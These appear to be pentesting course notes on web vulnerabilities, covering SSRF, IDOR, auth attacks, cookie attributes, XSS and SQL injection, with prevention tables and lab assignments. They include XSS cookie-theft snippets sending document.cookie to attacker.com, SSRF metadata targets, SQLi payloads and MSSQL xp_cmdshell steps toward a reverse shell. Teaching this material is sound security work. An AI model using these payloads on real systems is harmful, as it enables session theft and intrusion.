# Day 15 — Web Vulnerabilities Deep Dive

**Proxy Tools, OWASP/CWE, SSRF, IDOR, Parameter Pollution, Auth Attacks, Cookies & Sessions, XSS & SQL Injection**

**Date:** Saturday May 09, 2026

---

## Proxy Tools — Burp Suite & Others

A **proxy tool** sits between your browser and the target server, intercepting and allowing modification of HTTP/S traffic in real time.

**Burp Suite** is the industry-standard web proxy for pentesters:
- **Proxy tab** — intercept and modify requests/responses before they reach the server or browser
- **Repeater** — resend and tweak individual requests manually
- **Intruder** — automated fuzzing and brute-force (positions + payloads)
- **Scanner** (Pro) — automated vulnerability scanning
- **Decoder / Comparer** — encode/decode data, diff two responses
- **Logger / HTTP history** — full log of all traffic passing through

Other proxy tools:
- **OWASP ZAP** — open-source alternative to Burp, good for automated scanning
- **mitmproxy** — terminal-based, scriptable with Python
- **Caido** — modern Burp alternative, gaining traction

---

## OWASP & Beyond

**OWASP (Open Worldwide Application Security Project)** is a non-profit that publishes free, community-driven security standards and resources.

Key OWASP resources:
- **OWASP Top 10** — the ten most critical web application security risks (updated periodically; e.g. A01 Broken Access Control, A03 Injection, A07 Identification & Authentication Failures)
- **OWASP Testing Guide** — detailed methodology for manual pentesting
- **OWASP WSTG** — Web Security Testing Guide
- **OWASP ASVS** — Application Security Verification Standard (for developers/reviewers)
- **OWASP Cheat Sheet Series** — quick reference cards per vulnerability type

Other frameworks beyond OWASP:
- **PTES** — Penetration Testing Execution Standard
- **NIST** — National Institute of Standards and Technology guidelines
- **CVSS** — Common Vulnerability Scoring System (severity scoring)

---

## CWE — Common Weakness Enumeration

**CWE** is a community-developed list maintained by MITRE that categorizes **software and hardware weaknesses** — the root causes that lead to vulnerabilities.

- Think of **CVE** = a specific vulnerability in a specific product
- **CWE** = the *class* of weakness behind it (e.g. CWE-89 = SQL Injection, CWE-79 = XSS, CWE-22 = Path Traversal)
- Used by NIST's NVD, SAST tools, and bug bounty programs to classify findings
- Every CVE maps to one or more CWEs

Knowing the CWE for a finding helps communicate root cause, not just symptom.

---

## SSRF — Server-Side Request Forgery

**What it is:** You trick the server into making HTTP requests on your behalf — to internal systems the server can reach but you cannot directly.

**How it works:**
```
Attacker → Server → Internal target (AWS metadata, internal API, DB admin panel)
```

**Where to look for SSRF:**
- Parameters that take a URL as input (`url=`, `endpoint=`, `webhook=`, `imageUrl=`, `redirect=`)
- File import / RSS feed / document conversion features
- PDF generators, screenshot services, embed previews

**Classic SSRF targets:**
- `http://169.254.169.254/latest/meta-data/` — AWS EC2 metadata (leaks IAM keys)
- `http://localhost/admin` — internal admin interfaces
- Internal microservices on `10.x.x.x` or `192.168.x.x`
- `file:///etc/passwd` (if `file://` scheme is allowed)

**Blind SSRF** — server makes the request but you don't see the response; detect with out-of-band callbacks (Burp Collaborator, interactsh).

**Bypasses:** IP encoding tricks (`0x7f000001` = 127.0.0.1), DNS rebinding, open redirects chained to SSRF.

---

## IDOR — Insecure Direct Object Reference

**What it is:** The server exposes a direct reference to an internal object (ID, filename, account number) and doesn't verify whether the requesting user is *authorized* to access it.

**Where to find IDOR:**
- URL path: `/api/users/1042/profile`, `/invoice/8821/download`
- Query params: `?account_id=5001`, `?order=33221`
- POST/PUT body: `{ "userId": 102 }`
- **Headers** — especially in React/Next.js:
  - **`next-action` header** — Next.js Server Actions use this header to identify which server-side function to invoke. The function name/ID is often predictable or enumerable. If the action doesn't enforce authorization, swapping the `next-action` value can trigger privileged server-side functions belonging to other users or roles.
  - `X-User-ID`, `X-Account`, `Authorization` payloads with embedded IDs

**How to test:**
1. Create two accounts (A and B)
2. Capture a request made by account A that references A's object ID
3. Send the same request authenticated as B — did you get A's data?

**IDOR vs BOLA:** BOLA (Broken Object Level Authorization) is the API-specific term used in OWASP API Top 10; IDOR is the older web term — same concept.

---

## Parameter Pollution

**What it is:** Sending the same parameter multiple times in a request to confuse how the server or intermediary parses it.

```
GET /search?role=user&role=admin
POST body: username=alice&username=admin
```

**Why it works:** Different layers (WAF, backend framework, database) may parse duplicate parameters differently:
- WAF sees the first → `user` (passes)
- Backend takes the last → `admin` (privilege escalation)

**Where to test:**
- URL query strings
- POST form bodies
- JSON arrays: `{"role": ["user", "admin"]}`
- HTTP headers with repeated values

---

## Brute Force vs Credential Stuffing vs Password Spraying

| Attack | What it does | Detection signal |
|--------|-------------|-----------------|
| **Brute Force** | Tries all possible passwords for one account | Many failed logins on *one* account |
| **Credential Stuffing** | Uses leaked username:password combos from other breaches | Distributed IPs, valid-looking credentials, low error rate |
| **Password Spraying** | Tries one common password across *many* accounts | Low-frequency failures spread across many accounts — evades lockout |

**Password Spraying** is especially effective against enterprise environments with lockout policies (e.g. 5 attempts before lockout — spray 4 attempts per account across thousands of accounts).

---

## MFA & 2FA — And How They Get Compromised

**2FA (Two-Factor Authentication)** — requires two of: something you know, have, or are.  
**MFA (Multi-Factor Authentication)** — same concept, can be 2+ factors.

**Common MFA methods:**
- TOTP codes (Google Authenticator, Authy) — time-based one-time password
- SMS OTP — weakest; subject to SIM swapping
- Push notifications (Duo, Okta Verify)
- Hardware keys (YubiKey / FIDO2/WebAuthn) — strongest

**How MFA gets compromised:**

| Method | How |
|--------|-----|
| **SIM Swapping** | Social-engineer the carrier into porting the victim's number to attacker's SIM |
| **Real-Time Phishing** | Attacker proxies credentials + OTP live (Evilginx2, Modlishka) |
| **MFA Fatigue / Push Bombing** | Spam push notifications until victim accidentally approves |
| **OTP Bypass** | Response manipulation — change `"mfa_required": true` to `false` in the response |
| **OTP Reuse** | If server doesn't invalidate OTP after use |
| **Predictable OTP** | Weak PRNG seeding makes codes guessable |
| **Account Recovery Bypass** | Skip MFA entirely via weak password reset flow |

---

## Is HTTP Stateless?

**Yes.** HTTP is a stateless protocol — each request is independent. The server has no built-in memory of previous requests.

To *simulate* state (keeping users logged in, tracking carts, etc.), applications layer state management on top via:
- **Cookies** — the browser sends them automatically on every request
- **Sessions** — server-side storage keyed by a session ID sent in a cookie
- **Tokens (JWT)** — self-contained state encoded in the token itself

---

## What is a Cookie?

A **cookie** is a small piece of data the server sends to the browser (`Set-Cookie` header), which the browser stores and automatically re-sends on subsequent requests to that domain (`Cookie` header).

**Cookie attributes:**

| Attribute | What it does |
|-----------|-------------|
| `HttpOnly` | Cookie is not accessible via JavaScript (`document.cookie`) — mitigates XSS-based cookie theft |
| `Secure` | Cookie is only sent over HTTPS — prevents transmission over plain HTTP |
| `SameSite` | Controls when the cookie is sent with cross-site requests — mitigates CSRF |
| `Expires` / `Max-Age` | Defines cookie lifetime; session cookie if omitted |
| `Domain` | Which domain the cookie applies to |
| `Path` | Which URL path the cookie is scoped to |

---

## HttpOnly

`HttpOnly` makes the cookie **inaccessible to JavaScript**.

```http
Set-Cookie: session=abc123; HttpOnly
```

- `document.cookie` will NOT return this cookie
- It is still sent automatically in every HTTP request
- **Why it matters:** XSS payloads that try to steal cookies (`document.cookie`) cannot read HttpOnly cookies — significantly reduces XSS impact

---

## Secure (Cookie Attribute)

`Secure` means the cookie is **only transmitted over HTTPS** — never over plain HTTP.

```http
Set-Cookie: session=abc123; Secure
```

- Prevents a network attacker (MITM on HTTP) from intercepting the session cookie
- Should always be set for authentication cookies on any site that uses HTTPS

---

## SameSite (Cookie Attribute) & Modes

`SameSite` controls whether the browser sends the cookie on **cross-site requests** (requests originating from a different site).

**The three modes:**

| Mode | When cookie is sent |
|------|-------------------|
| `Strict` | Only on same-site requests (never on cross-site navigations or requests) |
| `Lax` | On same-site requests AND top-level navigations (clicking a link) — NOT on cross-site POST, img, iframe |
| `None` | Always sent, including cross-site — **must** be paired with `Secure` |

**Default (if not set):** Most modern browsers now default to `Lax` if `SameSite` is omitted.

**Primary protection:** CSRF — `Strict`/`Lax` prevent a malicious site from silently making authenticated requests to the target site.

---

## SameSite Modes in the Context of XSS

SameSite affects **what cookies are available when an XSS payload runs**:

- `Strict` / `Lax` — if an attacker delivers XSS via a cross-site link, the target site's cookies still exist in the browser but:
  - `HttpOnly` cookies → not readable by JS regardless
  - Non-HttpOnly cookies → still readable by JS from *within* the same site (XSS runs on the target origin, so SameSite doesn't block the JS from reading cookies that are already loaded — SameSite only restricts *sending* cookies on requests, not JS access)
- The real combo for cookie theft: `HttpOnly` blocks JS access; `Secure` blocks MITM; `SameSite=Strict` blocks CSRF chained with XSS
- XSS executing on the target origin bypasses SameSite's cross-site restriction because the script is now *same-site*

---

## Session Rotation

**What it is:** Issuing a **new session ID** at privilege change points (especially after login) to prevent session fixation attacks.

**Session Fixation:** Attacker sets a known session ID for the victim before login → victim logs in → attacker uses that same ID (now authenticated).

**Prevention:** Invalidate and regenerate the session ID at:
- Login
- Logout
- Role/privilege change
- Sensitive operations

---

## Supply Chain Attack

**What it is:** Attacking a target by compromising a *dependency or third-party component* they use, rather than attacking the target directly.

Examples:
- **SolarWinds (2020)** — malicious update pushed to 18,000+ organizations via the Orion software update mechanism
- **npm package poisoning** — publishing malicious packages with typo-squatted names or hijacking maintainer accounts
- **Compromised CDN** — injecting malicious JS into a CDN library used by thousands of sites

**Why it's effective:** You attack the weakest link in the supply chain — often a small open-source maintainer — and gain access to all their downstream consumers.

**Mitigation:** Subresource Integrity (SRI) for CDN scripts, dependency pinning, software bill of materials (SBOM), and auditing third-party packages.

---

## Injection

**Injection** is the #1 class of web vulnerabilities (historically) — sending untrusted data to an interpreter as part of a command or query.

Categories:
- **SQL Injection** — data interpreted as SQL
- **XSS** — data interpreted as HTML/JS
- **Command Injection** — data interpreted as OS shell commands
- **LDAP Injection**, **XML/XPath Injection**, **Template Injection (SSTI)**

The root cause is always the same: **user input is concatenated directly into an interpreter command** without sanitization or parameterization.

---

## XSS — Cross-Site Scripting

**What it is:** Injecting malicious JavaScript into a web page that runs in another user's browser.

XSS is a *client-side* injection — the server sends attacker-controlled script to the victim's browser.

### Types of XSS

| Type | How it works |
|------|-------------|
| **Reflected XSS** | Payload in the request (URL param, form field) is reflected immediately in the response — not stored. Requires tricking the victim into clicking a crafted link. |
| **Stored (Persistent) XSS** | Payload is saved to the database and served to every user who views that content (e.g. comment, profile name). Highest severity. |
| **DOM-based XSS** | Vulnerability is in client-side JavaScript — the page's own JS reads attacker-controlled data (e.g. `location.hash`) and writes it to the DOM unsafely. Never touches the server. |
| **Blind XSS** | Stored XSS where the payload fires in an admin panel or internal tool you can't see directly. Use out-of-band callbacks (e.g. XSS Hunter, Burp Collaborator) to confirm execution. |

### How to Detect XSS

1. Identify input reflection points (search boxes, profile fields, URL params, headers)
2. Submit a unique test string (`xsstest123`) and find where it appears in the response
3. Check the HTML context: is it inside a tag attribute? A `<script>` block? Inside a comment?
4. Attempt a breaking payload appropriate to the context

### XSS Payloads

Basic confirmation:
```html
<script>alert(1)</script>
```

Attribute context:
```html
" onmouseover="alert(1)
```

JavaScript context (inside a `<script>` block):
```javascript
';alert(1)//
```

Event handler:
```html
<img src=x onerror=alert(1)>
```

### Tags in XSS — SVG and Others

When `<script>` is blocked, alternative tags that execute JS:
```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
```

**SVG** is particularly useful because it's a valid XML/HTML element accepted in many contexts, and its `onload` event fires without user interaction.

### What's the Point of Finding XSS?

- **Session hijacking** — steal non-HttpOnly cookies: `document.cookie`
- **Credential theft** — inject fake login forms, keyloggers
- **Account takeover** — change email/password via CSRF-equivalent actions from victim's session
- **Phishing / defacement** — redirect users, display fake content
- **Malware delivery** — redirect to exploit kits
- **Internal network scanning** — JavaScript can make requests to internal IPs from the victim's browser

### Cookies & XSS Payloads

Classic cookie theft payload:
```javascript
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
```

Or via `new Image()`:
```javascript
<script>
  new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie);
</script>
```

**Limitation:** `HttpOnly` cookies are invisible to `document.cookie` — they won't be exfiltrated this way.

### SameSite Modes and XSS Payload Impact

- `SameSite=None` — no restriction; cookie sent on all cross-site requests the payload triggers
- `SameSite=Lax` — cookie sent on top-level GET navigations but not on fetch/XHR cross-site requests triggered by JS
- `SameSite=Strict` — cookie only sent if the request originates from the same site; XSS payload running on the same origin (same site) still has access to the session in that context
- Key insight: SameSite restricts *sending* cookies on cross-site requests, not JS *reading* them from the same origin

### How to Prevent XSS

| Defense | How |
|---------|-----|
| **Output encoding** | Encode user data before rendering it in HTML (use `htmlspecialchars()`, OWASP Java Encoder, etc.) |
| **Content Security Policy (CSP)** | HTTP header that restricts which scripts can run — blocks inline scripts and untrusted sources |
| **HttpOnly cookies** | Prevents cookie theft even if XSS fires |
| **Input validation** | Whitelist allowed characters server-side |
| **Avoid `innerHTML`** | Use `textContent` or `innerText` in JS; use `DOMPurify` if HTML rendering is needed |
| **Trusted Types (browser API)** | Enforces that DOM writes go through sanitization |

---

## Defacement via Injection

**Web defacement** is replacing or altering a site's visible content — typically its homepage — to display an attacker's message.

Via injection it happens when:
- **XSS** — stored XSS that rewrites `document.body.innerHTML` for every visitor
- **SQL injection** — updating content stored in the database (e.g. updating a `page_content` table)
- **Command injection** — overwriting static HTML files on disk

Defacement is often used by hacktivists but from a pentest perspective it demonstrates *write access* to the application, which is high severity.

---

## SQL — Structured Query Language & Syntax

**SQL** is the language used to query and manipulate relational databases.

Core syntax:

```sql
-- Select
SELECT column1, column2 FROM table WHERE condition;

-- Insert
INSERT INTO table (col1, col2) VALUES ('val1', 'val2');

-- Update
UPDATE table SET col1 = 'val' WHERE condition;

-- Delete
DELETE FROM table WHERE condition;

-- Common clauses
ORDER BY column ASC/DESC
LIMIT 10
UNION SELECT col1, col2 FROM other_table
-- (UNION requires same number and type of columns)
```

Comment syntax (used heavily in SQLi payloads):
```sql
-- MySQL/MSSQL:   --  or  #
-- Oracle/PostgreSQL:  --
```

---

## SQL Injection Types

| Type | How it works |
|------|-------------|
| **In-band (Classic)** | Results returned directly in the HTTP response |
| **Error-based** | Craft a query that causes a DB error containing data (e.g. `EXTRACTVALUE`, `UPDATEXML` in MySQL) |
| **Union-based** | Append a `UNION SELECT` to extract data from other tables — requires knowing column count/types |
| **Blind Boolean-based** | Ask true/false questions (`AND 1=1` vs `AND 1=2`) and observe response differences |
| **Blind Time-based** | Inject a time delay (`SLEEP(5)`) — if response takes 5s, query is true |
| **Out-of-band** | Exfiltrate data via DNS/HTTP request from the DB server (requires specific DB permissions) |
| **Second-Order** | Payload is stored safely, but injected into a *later* query when the stored value is used |

---

## Where to Check for SQL Injection

- **URL parameters**: `?id=1`, `?category=shoes`
- **Form fields**: login, search, registration
- **Cookie values**: `session=abc` — if cookie value is used in a query
- **HTTP headers**: `User-Agent`, `X-Forwarded-For`, `Referer` — sometimes logged/stored and later queried
- **JSON/XML request bodies**: API parameters
- **Host header**: used in some multi-tenant apps to look up tenant config

---

## Second-Order SQL Injection

The payload is stored in the database in a first request, then later **unsafely retrieved and used in a second query** — in a context where the developer assumed the data was already safe because it came from the DB.

**Example:**
1. Register with username: `admin'--`
2. Server safely inserts it (parameterized) — no injection at registration
3. Later, a "change password" function does:
   ```sql
   UPDATE users SET password='...' WHERE username='' + stored_username + ''
   ```
4. The stored `admin'--` is concatenated unsafely → SQL injection fires

Second-order is harder to detect because the input and the injection point are in different requests.

---

## How to Detect SQL Injection

1. **Single quote test** — append `'` to a parameter. DB error or behavior change = likely injectable
2. **Boolean tests** — `AND 1=1` (normal response) vs `AND 1=2` (different/empty response)
3. **Time delay** — `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `'; SELECT SLEEP(5)--` (MySQL)
4. **Error messages** — look for DB error strings: `SQL syntax`, `ORA-`, `ODBC`, `unclosed quotation mark`
5. **Automated** — `sqlmap -u "http://target.com/page?id=1"` (for labs/CTF)

---

## SQL Features Used in Exploitation

- `UNION SELECT` — combine results from another table
- `INFORMATION_SCHEMA.TABLES` / `INFORMATION_SCHEMA.COLUMNS` — enumerate database structure
- `GROUP_CONCAT()` (MySQL) — dump multiple values in one field
- `LOAD_FILE()` / `INTO OUTFILE` (MySQL) — read/write files if DB user has FILE privilege
- `@@version`, `user()`, `database()` — extract DB metadata
- Stacked queries (`;`) — if the driver supports multiple statements

---

## MSSQL — Escalate to Shell

MSSQL has a feature called `xp_cmdshell` that lets the DB execute OS commands.

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute a command
EXEC xp_cmdshell 'whoami';

-- Get a reverse shell
EXEC xp_cmdshell 'powershell -e <base64_payload>';
```

This turns SQL injection into **remote code execution** if:
- The DB user has `sysadmin` privileges (or `xp_cmdshell` is already enabled)
- A low-privilege user can escalate via `IMPERSONATE` or other misconfigs

---

## How to Prevent SQL Injection

| Defense | How |
|---------|-----|
| **Parameterized queries / Prepared statements** | The query structure is defined before any user data is inserted — user input can never alter the query structure |
| **Stored procedures** | Pre-compiled queries, safer if written correctly (still vulnerable if they use dynamic SQL internally) |
| **Input validation** | Whitelist expected input types/formats |
| **Least privilege** | DB accounts used by the app should have only SELECT/INSERT — not DROP, FILE, or admin |
| **WAF** | Can block common payloads but is not a substitute for parameterized queries |
| **Error handling** | Don't expose DB error messages to users |

**Parameterized query example (Python):**
```python
# Vulnerable:
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")

# Safe:
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

---

## Task: PortSwigger Labs

Assigned labs to complete on [PortSwigger Web Academy](https://portswigger.net/web-security):

- [ ] SQL Injection labs (apprentice → practitioner)
- [ ] XSS labs — reflected, stored, DOM-based
- [ ] Blind XSS / out-of-band
- [ ] SSRF labs
- [ ] IDOR / Access Control labs

> Document each lab: what the vulnerability was, the payload used, what the impact would be in a real scenario.
